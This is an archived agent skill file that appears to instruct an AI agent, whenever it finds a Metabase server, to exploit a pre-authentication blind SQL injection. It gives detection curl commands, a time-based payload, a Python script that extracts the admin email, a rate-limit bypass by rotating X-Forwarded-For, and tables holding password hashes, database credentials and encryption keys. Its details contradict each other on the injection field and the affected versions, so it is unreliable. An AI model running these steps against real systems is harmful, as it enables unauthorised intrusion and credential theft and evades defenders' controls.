<!-- archived from /root/.hermes/skills/security/metabase-preauth-sqli/SKILL.md on 2026-10-21 -->

---
name: metabase-preauth-sqli
description: "Use when Metabase found. Pre-auth blind SQLi."
---

> 归档卡：原目录 `/root/.hermes/skills/security/metabase-preauth-sqli`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/metabase-preauth-sqli/…')`，不要相对 `references/legacy/` 解析。

# CVE-2026-72898 Metabase Pre-Auth Blind SQLi (CVSS 10.0)

## Overview
Metabase < 0.52.16 / < 1.52.16 Enterprise. `/api/session/reset_password` passes `token` into HoneySQL `{:raw ...}` without sanitization — time-based blind SQLi **without auth**.

## Detection
```bash
curl -s <TARGET>/api/session/properties | grep -o '"version":"[^"]*"'
curl -s -o /dev/null -w '%{http_code}' -X POST <TARGET>/api/session/reset_password
# 400 = endpoint exists
```

## Exploitation

### Injection point
The `user-id` field (not token) reaches HoneySQL `{:raw ...}` — send a JSON object `{"raw":"<SQL>"}` as `user-id` value. Token must match `\d+_\w+` pattern (use `1_0000`).

### Confirm (PostgreSQL)
```bash
# Should take ~1.6s if vulnerable
time curl -s -o /dev/null -X POST \
  -H 'Content-Type: application/json' \
  -H 'X-Forwarded-For: 1.2.3.4' \
  -d '{"token":"1_0000","password":"TestPassword1!","user-id":{"raw":"(SELECT 1 FROM pg_sleep(1.6))"}}' \
  http://<TARGET>/api/session/reset_password
```

### Extract admin email
```python
import requests, time, string, random
TARGET = 'http://<TARGET>'
CHARSET = string.ascii_lowercase + string.digits + '-_@.'
def check(payload):
    start = time.time()
    requests.post(f'{TARGET}/api/session/reset_password',
        json={'token': payload, 'password': 'Test1234!'},
        headers={'X-Forwarded-For': f'{random.randint(1,254)}.{random.randint(1,254)}.0.1'})
    return time.time() - start > 4
def extract(query):
    result = ''
    for i in range(1, 50):
        for c in CHARSET:
            sqli = f"a') OR (SELECT CASE WHEN (SUBSTRING(({query}),{i},1)='{c}') THEN pg_sleep(5) ELSE pg_sleep(0) END)--"
            if check(sqli): result += c; print(result); break
        else: break
    return result
extract("SELECT email FROM core_user WHERE is_superuser=true LIMIT 1")
```

### Rate limit bypass
Rotate `X-Forwarded-For` per request.

### Key tables
- `core_user` — email, password_salt, password, is_superuser, reset_token
- `metabase_database` — details (DB creds in JSON)
- `setting` — encryption keys

## Affected Versions
- Vulnerable: Metabase OSS 0.x / EE 1.x: v58.0–v58.23, v59–v59.20, v60–v60.16, v61–v61.10, v62–v62.8, v63–v63.4
- Patched: v58.24 / v59.21 / v60.17 / v61.11 / v62.9 / v63.5+ (adds `pos-int?` check on `user-id`)

## Pitfalls
- `user-id` is the injection point, NOT `token` — `{"raw":"..."}` is HoneySQL raw SQL literal
- Token format must match `\d+_\w+` (use `1_0000`) or request rejected before reaching vuln code
- H2 embedded uses `SLEEP()` not `pg_sleep()`
- Rate limit per-IP — must rotate `X-Forwarded-For` every request
- Sleep tuning: 0.4s on LAN, 1.0-2.0s over internet to avoid false negatives
- Cast via `((<expr>)::text)` for non-text columns
- Source: EQSTLab/CVE-2026-72898
